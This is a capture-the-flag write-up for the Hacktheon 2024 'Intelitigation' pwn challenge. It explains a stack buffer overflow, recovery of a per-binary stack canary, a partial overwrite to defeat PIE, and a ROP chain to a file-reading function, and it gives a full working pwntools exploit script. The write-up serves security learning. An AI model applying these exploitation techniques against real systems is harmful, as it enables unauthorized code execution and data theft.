---
title : "Intelitigation [pwn]"
categories: HacktheonSejong2024
---

Fun ROP challenge with stack canary and PIE bypass.

# Challenge Description

A new mitigation has been applied to this program. Can you exploit it?

`nc hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com 5001`

# Solution

We don't have any files, so let's try to connect via `nc` and see.

```
This is Your Binary>

f0VMR...
...
...AAAAAAAAAAAAAAAAAA=
input>
```

We get a huge chunk of base 64 string, apparently this is our binary to pwn. After extracting one and saving it locally, I started to wonder why they give the binaries like this. And I thought that it could be because they are different at every connection! So I saved another one to compare.

The two binaries are basically the same program. It takes in an input, and prints it back out to you. The basic outline is like this:

```c
void main()
{
    main_inner();
}

void main_inner()
{
    ...
    undefined8 local_218;
    undefined8 local_210;
    undefined8 local_208 [63];
    long local_10;

    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    printf("input> ");
    local_218 = 0;
    local_210 = 0;
    puVar2 = local_208;
    for (lVar1 = 0x3e; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
    }
    read(0,&local_218,0x300);
    printf("Your input> ");
    printf("%s",&local_218);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
}
```

Notice that we have stack buffer overflow vulnerability here, but the catch is that there is stack canary (saved on the stack at `local_10` and checked at the end). Here's where the differences between the files come:

The stack canary is actually fixed at startup by an initializer code:

```c
void _INIT_1(void)
{
  undefined8 uVar1;
  
  setup();
  uVar1 = get_canary_val();
  fix_canary(uVar1);
  return;
}
```

I renamed some of the code but it's pretty obvious.

```c
undefined8 get_canary_val(void)
{
  return null_ARRAY_00104020[DAT_00104070];
}

void fix_canary(undefined8 param_1)
{
  long in_FS_OFFSET;
  
  *(undefined8 *)(in_FS_OFFSET + 0x28) = param_1;
  return;
}
```

The values in `null_ARRAY_00104020` and `DAT_00104070` are different for each binary you get. So we just have to read the binary, find these `.data` values on the spot and determine the stack canary, then we bypass stack canary.

```python
conn = remote("hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com", 5001)
conn.recvline()
conn.recvline()

binary = conn.recvline(keepends=False).decode()
b = b64decode(binary)

canary_base = 0x3020
canary_offset = b[0x3070] * 8
canary_pos = canary_base + canary_offset

canary = b[canary_pos:canary_pos+8]
info("Canary: " + hex(int.from_bytes(canary, 'little')))
```

But this begs the question: What goal are we trying to achieve? Do we get shell? To answer this, and thanks to the small number of functions in the binary, we see a function at offset `0x0010124e` that opens a file and writes it to stdout to us.

```c
void win(char *param_1)
{
  int __fd;
  
  __fd = open(param_1,0);
  read(__fd,&DAT_001040c0,100);
  write(1,&DAT_001040c0,100);
  return;
}
```

This seems to be the only thing exploitable, which means we have to leverage the stack BOF and stack canary bypass to perform ROP by setting up the arguments and returning to `win`.

The next problem, though, is PIE. We would have to leak some code address to actually return correctly. Thankfully, because of the `main` and `main_inner` structure, we can get the address in `main` before we return from `main_inner`.

When we send our payload (input), it is a bunch of padding + canary + rbp padding + return address. When the program prints our input, because our payload shouldn't have null bytes (depending on the canary), we will get everything up to the return address. After this, we want to go back to `main_inner` again to craft a second payload to do the actual ROP.

To achieve this, since we still don't know the program base address yet due to PIE, our first payload only has to write the lower 2 bytes since PIE places the program at memory pages aligned at 0x1000 bytes, meaning that the address of `main_inner` will always be `0x....324` since its offset is `0x00101324`. The upper nibble of the second LSB will be a guess, so we have to try multiple times until we hit the jackpot. I added 5 to the address of `main_inner` because of the classic ROP issue with stack alignment.

First payload:
```python
padding = b"A" * (0x218 - 0x10)

payload = padding + canary + b"B" * 8
# LSB to `main_inner`
payload += b"\x29\x13"

assert(len(payload) <= 0x300)
conn.sendafter(b"> ", payload)
```

Now the final piece of the puzzle: where do we put our argument (the filename "flag") and what gadgets do we use to populate it? I poked around the few number of functions and looked at the assembly instruction and found this at offset `0x001012b4`:

```nasm
MOV        RDI,RSP
POP        R8
RET
```

This essentially uses the top of the stack (`rsp`) as a string pointer and stores it into `rdi`, then pops that string off. So, we can just put our string on top of the stack and go to this gadget, then go to our `win`!

# Final Script
```python
from base64 import b64decode
from pwn import *
from time import sleep

def init(n = -1):
    if args.LOCAL:
        conn = process("./bin")
        b = open("./bin", "rb").read()
        
    else:
        conn = remote("hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com", 5001)
        conn.recvline()
        conn.recvline()

        binary = conn.recvline(keepends=False).decode()
        b = b64decode(binary)
        with open("bin" + ("" if n == -1 else str(n)), "wb") as f:
            f.write(b)
        
    return conn, b

TRIAL = 50
for _ in range(TRIAL):
    conn, b = init()
    if args.TEST:
        pause()

    try:
        canary_base = 0x3020
        canary_offset = b[0x3070] * 8
        canary_pos = canary_base + canary_offset

        canary = b[canary_pos:canary_pos+8]
        info("Canary: " + hex(int.from_bytes(canary, 'little')))

        padding = b"A" * (0x218 - 0x10)

        """
        conn.sendafter(b"> ", padding)
        conn.recvuntil(b"> ")

        res = conn.recvline(keepends=False)
        leaked = res[len(padding):len(padding)+8]

        assert(canary == leaked)
        """
        
        payload = padding + canary + b"B" * 8
        # LSB to `main_inner`
        payload += b"\x29\x13"

        assert(len(payload) <= 0x300)
        conn.sendafter(b"> ", payload)

        conn.recvuntil(b"> ")

        # See if we're back in `main_inner`
        result = conn.clean(timeout=5)
        
        if b"input> " not in result:
            # try again
            conn.close()
            continue
        
        main_addr = int.from_bytes(result[len(payload)-2:][:6], 'little')
        success("Address of main_inner: " + hex(main_addr))
        
        base_addr = main_addr & 0xfffffffffffff000
        
        mov_rdi_rsp = base_addr | 0x2b4
        win_addr = base_addr | 0x24e
        
        payload = padding + canary + b"B" * 8
        payload += p64(mov_rdi_rsp)
        payload += b"flag\x00\x00\x00\x00"
        payload += p64(win_addr)

        assert(len(payload) <= 0x300)
        conn.send(payload)
        
        print(conn.clean(timeout=5))
    
        conn.close()
        
        break
    except:
        conn.close()
        
    sleep(1)
```

Flag: `Th1s_1s_b34ut1fu1_c4n4ry`